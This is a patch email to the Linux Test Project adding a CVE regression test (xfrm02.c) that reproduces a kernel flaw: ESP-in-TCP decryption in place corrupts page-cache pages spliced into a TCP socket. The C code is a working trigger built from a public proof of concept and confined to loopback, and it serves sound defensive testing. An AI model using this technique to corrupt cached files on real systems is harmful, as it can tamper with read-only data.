Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 37F0ECD4851
	for <ltp@archiver.kernel.org>; Wed, 13 May 2026 14:36:38 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id 38A4A3E5406
	for <ltp@archiver.kernel.org>; Wed, 13 May 2026 16:36:36 +0200 (CEST)
Received: from in-5.smtp.seeweb.it (in-5.smtp.seeweb.it
 [IPv6:2001:4b78:1:20::5])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (secp384r1) server-digest SHA384)
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id 0121C3D86E3
 for <ltp@lists.linux.it>; Wed, 13 May 2026 16:36:17 +0200 (CEST)
Received: from smtp-out2.suse.de (smtp-out2.suse.de [195.135.223.131])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-5.smtp.seeweb.it (Postfix) with ESMTPS id F122D600D16
 for <ltp@lists.linux.it>; Wed, 13 May 2026 16:36:16 +0200 (CEST)
Received: from imap1.dmz-prg2.suse.org (unknown [10.150.64.97])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by smtp-out2.suse.de (Postfix) with ESMTPS id 37DD97677F;
 Wed, 13 May 2026 14:36:15 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1778682976; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=0w1dTBp0Cq6rALgCfIrAh0gvNsHL/6po+wj+pB7UtyM=;
 b=uJ0Nd+XE2NrytfZ+t4bJmvyWcsYM0QzT1MgkIseEyd6YHWa6tDGY3+lMIPJhQCsIkU2UoU
 vURkRd2+8OIzl+dx2duTYSCXTwXrqGfLSQ0liLj82OM5hCh7Ld0x7OAHwEpkwuWWhGCb0h
 Yvv3T9j7XFr7wlR5nOYfk/WQ8ABzbc0=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1778682976;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=0w1dTBp0Cq6rALgCfIrAh0gvNsHL/6po+wj+pB7UtyM=;
 b=Nw00/p7SR4ck4sT9rzsAp4sW3ZN/OatfHYUYZyX1aJoQdebdHQ20XREC7RRBQU3AUgbssZ
 Pk7oKaaWR1fk+WDw==
Authentication-Results: smtp-out2.suse.de;
	none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1778682975; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=0w1dTBp0Cq6rALgCfIrAh0gvNsHL/6po+wj+pB7UtyM=;
 b=RwswbqobTgNs1AOzcSIrBSp/+TmyGGsWr0xRtFK6pkPo5TuOZ648ULlqp6Pl45dFPR6ch6
 ZEswTC8WrrSudxnAAsvm6YRJjRdPMRjBj4T1u+XYvuAI11YFeeJRYiV7U3fhfpAdo/RGIu
 I9lrU3WkbSWv7LwMoX5PeAGrSOHa8YA=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1778682975;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding;
 bh=0w1dTBp0Cq6rALgCfIrAh0gvNsHL/6po+wj+pB7UtyM=;
 b=srsVXp8k/JzJBzvO+mVQ/2UTGnHLlQ2HeBHMGcUhdFlXufJUVw+p7io9/UqDAiIEhk4oHw
 q7nx+RvUdT8wiiBw==
Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id 130A5593A9;
 Wed, 13 May 2026 14:36:15 +0000 (UTC)
Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
 by imap1.dmz-prg2.suse.org with ESMTPSA id GqxXAl+MBGorJAAAD6G6ig
 (envelope-from <andrea.cervesato@suse.de>); Wed, 13 May 2026 14:36:15 +0000
From: Andrea Cervesato <andrea.cervesato@suse.de>
Date: Wed, 13 May 2026 16:36:06 +0200
MIME-Version: 1.0
Message-Id: <20260513-fragnesia-v1-1-80c5b3b09005@suse.com>
X-B4-Tracking: v=1; b=H4sIAFWMBGoC/6tWKk4tykwtVrJSqFYqSi3LLM7MzwNyDHUUlJIzE
 vPSU3UzU4B8JSMDIzMDU0Nj3bSixPS81OLMRF1LUwuLFAtT06TU5DQloPqCotS0zAqwWdGxtbU
 A99Ra0FsAAAA=
X-Change-ID: 20260513-fragnesia-9588d855becf
To: Linux Test Project <ltp@lists.linux.it>
X-Mailer: b4 0.14.2
X-Developer-Signature: v=1; a=ed25519-sha256; t=1778682975; l=8095;
 i=andrea.cervesato@suse.com; s=20251210; h=from:subject:message-id;
 bh=L9e2VxBe/UVf74zGCC8oga4BobWsZVKupN9a0t+96po=;
 b=/KbujpB/7v2F10pQ7r3D0e1yCdw5Vcd4uDI23QgpiXdWxmozhvPc/V9BrrfSIvdqvK8r0FaM8
 fZYQhVtlr9mAiX/H3PssuaidIKoK4J+euPOzcOKxR3vq55pmmWp/FJ4
X-Developer-Key: i=andrea.cervesato@suse.com; a=ed25519;
 pk=zKY+6GCauOiuHNZ//d8PQ/UL4jFCTKbXrzXAOQSLevI=
X-Spamd-Result: default: False [-4.30 / 50.00]; BAYES_HAM(-3.00)[100.00%];
 NEURAL_HAM_LONG(-1.00)[-1.000];
 NEURAL_HAM_SHORT(-0.20)[-1.000]; MIME_GOOD(-0.10)[text/plain];
 FUZZY_RATELIMITED(0.00)[rspamd.com];
 RCVD_VIA_SMTP_AUTH(0.00)[]; ARC_NA(0.00)[];
 RCPT_COUNT_TWO(0.00)[2]; RCVD_TLS_ALL(0.00)[];
 DKIM_SIGNED(0.00)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
 TO_DN_ALL(0.00)[]; FROM_HAS_DN(0.00)[]; MIME_TRACE(0.00)[0:+];
 FROM_EQ_ENVFROM(0.00)[]; TO_MATCH_ENVRCPT_ALL(0.00)[];
 RCVD_COUNT_TWO(0.00)[2];
 DBL_BLOCKED_OPENRESOLVER(0.00)[imap1.dmz-prg2.suse.org:helo, suse.com:mid,
 suse.com:email]
X-Virus-Scanned: clamav-milter 1.0.9 at in-5.smtp.seeweb.it
X-Virus-Status: Clean
Subject: [LTP] [PATCH] sockets/xfrm02: Add ESP-in-TCP page cache corruption
 test
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

From: Andrea Cervesato <andrea.cervesato@suse.com>

Verify that ESP-in-TCP (espintcp) does not corrupt the page cache when
file data is spliced into a TCP socket. When MSG_SPLICE_PAGES references
page cache pages directly in the skb and the receiving socket has
espintcp ULP enabled, the kernel's ESP handler may decrypt the payload
in-place on those pages, corrupting the cached file contents.

The test sets up an ESP-in-TCP xfrm state on IPv6 loopback, writes
known data to a file, creates a TCP connection where the receiver
enables espintcp ULP, splices the file data into the TCP socket as
part of a crafted ESP-in-TCP frame, and then verifies whether the
page cache was corrupted.

Reproducer based on:
https://github.com/v12-security/pocs/tree/main/fragnesia

Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
---
 runtest/cve                          |   1 +
 testcases/network/sockets/.gitignore |   1 +
 testcases/network/sockets/xfrm02.c   | 229 +++++++++++++++++++++++++++++++++++
 3 files changed, 231 insertions(+)

diff --git a/runtest/cve b/runtest/cve
index 530f8751ed3a8e8aa7e9110d89d577df3e8cc6ce..5fe83ec2d1803a5c0f6b4eba05fcf00cc80c8809 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -95,3 +95,4 @@ cve-2025-38236 cve-2025-38236
 cve-2025-21756 cve-2025-21756
 cve-2026-31431 af_alg08
 cve-2026-43284 xfrm01
+cve-2026-fragnesia xfrm02
diff --git a/testcases/network/sockets/.gitignore b/testcases/network/sockets/.gitignore
index 6f3c0ad84c000f0214f371c6a601afb592b15faa..35bc0462b676b041d9a5b52a37fded973d0157a9 100644
--- a/testcases/network/sockets/.gitignore
+++ b/testcases/network/sockets/.gitignore
@@ -1 +1,2 @@
 /xfrm01
+/xfrm02
diff --git a/testcases/network/sockets/xfrm02.c b/testcases/network/sockets/xfrm02.c
new file mode 100644
index 0000000000000000000000000000000000000000..7497998015b6bd51db36e80f077173963fdef394
--- /dev/null
+++ b/testcases/network/sockets/xfrm02.c
@@ -0,0 +1,229 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
+/*
+ * Copyright (C) 2026 SUSE LLC Andrea Cervesato <andrea.cervesato@suse.com>
+ */
+
+/*\
+ * Verify that ESP-in-TCP (espintcp) does not corrupt the page cache
+ * when file data is spliced into a TCP socket.
+ *
+ * When file data is spliced into a TCP socket, the kernel uses
+ * MSG_SPLICE_PAGES to reference page cache pages directly in the skb.
+ * If the receiving socket has TCP_ULP "espintcp" enabled and a matching
+ * xfrm SA exists, the kernel's ESP handler decrypts the payload
+ * in-place on those page cache pages, corrupting the cached file
+ * contents.
+ *
+ * The test sets up an ESP-in-TCP xfrm state on IPv6 loopback, writes
+ * known data to a file, creates a TCP connection where the receiver
+ * enables espintcp ULP, splices the file data into the TCP socket as
+ * part of a crafted ESP-in-TCP frame, and then verifies whether the
+ * page cache was corrupted.
+ *
+ * Reproducer based on:
+ * https://github.com/v12-security/pocs/tree/main/fragnesia
+ */
+
+#define _GNU_SOURCE
+
+#include "tst_test.h"
+#include "tst_net.h"
+#include "tst_netdevice.h"
+#include "lapi/tcp.h"
+#include "lapi/splice.h"
+
+#define TESTFILE "pagecache_test"
+#define DATA_SIZE 4096
+
+#define SPI 0x100
+#define TCP_PORT 5556
+#define IV_LEN 8
+#define ESP_HDR_SIZE 16
+#define AES_KEYLEN 16
+#define SALT_LEN 4
+#define KEYTOTAL (AES_KEYLEN + SALT_LEN)
+
+/* ESP-in-TCP frame prefix: 2-byte length + ESP header */
+#define PREFIX_SIZE (2 + ESP_HDR_SIZE)
+
+#define XFRM_CMD \
+	"ip xfrm state add" \
+	" src ::1 dst ::1" \
+	" proto esp spi 0x%08x" \
+	" encap espintcp %d %d ::" \
+	" aead 'rfc4106(gcm(aes))' %s 128" \
+	" mode transport"
+
+static const uint8_t aead_key[KEYTOTAL] = {
+	0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
+	0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
+	0x01, 0x02, 0x03, 0x04
+};
+
+static uint8_t original[DATA_SIZE];
+static int file_fd = -1;
+static int srv_fd = -1;
+
+static void setup(void)
+{
+	char keyhex[KEYTOTAL * 2 + 3];
+	char cmd[512];
+	int i, ret;
+
+	tst_setup_netns();
+	NETDEV_SET_STATE("lo", 1);
+
+	keyhex[0] = '0';
+	keyhex[1] = 'x';
+	for (i = 0; i < KEYTOTAL; i++)
+		sprintf(keyhex + 2 + i * 2, "%02x", aead_key[i]);
+
+	snprintf(cmd, sizeof(cmd), XFRM_CMD, SPI, TCP_PORT, TCP_PORT, keyhex);
+
+	ret = tst_system(cmd);
+	if (ret)
+		tst_brk(TBROK, "Failed to install xfrm ESP-in-TCP state");
+
+	for (i = 0; i < DATA_SIZE; i++)
+		original[i] = (uint8_t)(i & 0xff);
+}
+
+static void try_corrupt(void)
+{
+	struct sockaddr_in6 addr = {
+		.sin6_family = AF_INET6,
+		.sin6_addr = IN6ADDR_LOOPBACK_INIT,
+		.sin6_port = htons(TCP_PORT),
+	};
+	uint8_t prefix[PREFIX_SIZE];
+	uint16_t frame_len;
+	uint32_t spi_net, seq_net;
+	char ulp[] = "espintcp";
+	char drain;
+	int acc_fd;
+	loff_t off;
+	pid_t pid;
+	int status;
+
+	frame_len = htons(PREFIX_SIZE + DATA_SIZE);
+	memcpy(prefix, &frame_len, 2);
+
+	spi_net = htonl(SPI);
+	memcpy(prefix + 2, &spi_net, 4);
+
+	seq_net = htonl(1);
+	memcpy(prefix + 6, &seq_net, 4);
+
+	memset(prefix + 10, 0xcc, IV_LEN);
+
+	srv_fd = SAFE_SOCKET(AF_INET6, SOCK_STREAM, 0);
+	SAFE_SETSOCKOPT_INT(srv_fd, SOL_SOCKET, SO_REUSEADDR, 1);
+	SAFE_BIND(srv_fd, (struct sockaddr *)&addr, sizeof(addr));
+	SAFE_LISTEN(srv_fd, 1);
+
+	pid = SAFE_FORK();
+
+	if (!pid) {
+		int cli_fd, pipefd[2];
+
+		SAFE_CLOSE(srv_fd);
+
+		cli_fd = SAFE_SOCKET(AF_INET6, SOCK_STREAM, 0);
+		SAFE_SETSOCKOPT_INT(cli_fd, IPPROTO_TCP, TCP_NODELAY, 1);
+		SAFE_CONNECT(cli_fd, (struct sockaddr *)&addr, sizeof(addr));
+
+		SAFE_SEND(1, cli_fd, prefix, sizeof(prefix), 0);
+		SAFE_PIPE(pipefd);
+
+		off = 0;
+		SAFE_SPLICE(file_fd, &off, pipefd[1], NULL, DATA_SIZE, 0);
+
+		/*
+		 * Splice pipe into TCP socket. The kernel uses
+		 * MSG_SPLICE_PAGES to keep page cache references in
+		 * the skb. On loopback the receiver's ESP handler may
+		 * decrypt in-place, corrupting the page cache. May
+		 * fail on patched kernels.
+		 */
+		splice(pipefd[0], NULL, cli_fd, NULL, DATA_SIZE, 0);
+
+		SAFE_CLOSE(pipefd[0]);
+		SAFE_CLOSE(pipefd[1]);
+		SAFE_CLOSE(cli_fd);
+
+		TST_CHECKPOINT_WAKE(0);
+		exit(0);
+	}
+
+	acc_fd = SAFE_ACCEPT(srv_fd, NULL, NULL);
+	SAFE_CLOSE(srv_fd);
+
+	TST_CHECKPOINT_WAIT(0);
+
+	SAFE_SETSOCKOPT(acc_fd, IPPROTO_TCP, TCP_ULP, ulp, sizeof(ulp));
+
+	/* Kick the espintcp strparser to process buffered ESP data */
+	SAFE_RECV(0, acc_fd, &drain, 1, 0);
+
+	SAFE_CLOSE(acc_fd);
+	SAFE_WAITPID(pid, &status, 0);
+}
+
+static void run(void)
+{
+	uint8_t readback[DATA_SIZE];
+
+	file_fd = SAFE_OPEN(TESTFILE, O_WRONLY | O_CREAT, 0444);
+	SAFE_WRITE(SAFE_WRITE_ALL, file_fd, original, DATA_SIZE);
+	SAFE_CLOSE(file_fd);
+
+	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
+	try_corrupt();
+	SAFE_CLOSE(file_fd);
+
+	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
+	SAFE_READ(1, file_fd, readback, sizeof(readback));
+	SAFE_CLOSE(file_fd);
+
+	if (memcmp(readback, original, DATA_SIZE) != 0)
+		tst_res(TFAIL, "Page cache corrupted via xfrm ESP-in-TCP splice");
+	else
+		tst_res(TPASS, "Page cache was not corrupted");
+
+	SAFE_UNLINK(TESTFILE);
+}
+
+static void cleanup(void)
+{
+	if (srv_fd != -1)
+		SAFE_CLOSE(srv_fd);
+
+	if (file_fd != -1)
+		SAFE_CLOSE(file_fd);
+}
+
+static struct tst_test test = {
+	.test_all = run,
+	.setup = setup,
+	.cleanup = cleanup,
+	.needs_tmpdir = 1,
+	.forks_child = 1,
+	.needs_checkpoints = 1,
+	.needs_kconfigs = (const char *[]) {
+		"CONFIG_USER_NS=y",
+		"CONFIG_NET_NS=y",
+		"CONFIG_XFRM",
+		"CONFIG_INET6_ESP",
+		"CONFIG_INET6_ESPINTCP",
+		"CONFIG_CRYPTO_GCM",
+		NULL
+	},
+	.save_restore = (const struct tst_path_val[]) {
+		{"/proc/sys/user/max_user_namespaces", "1024", TST_SR_SKIP},
+		{}
+	},
+	.needs_cmds = (struct tst_cmd[]) {
+		{.cmd = "ip"},
+		{}
+	},
+};

---
base-commit: e1fc50957c98ae4c27064756e063de0e7136cde3
change-id: 20260513-fragnesia-9588d855becf

Best regards,
-- 
Andrea Cervesato <andrea.cervesato@suse.com>


-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
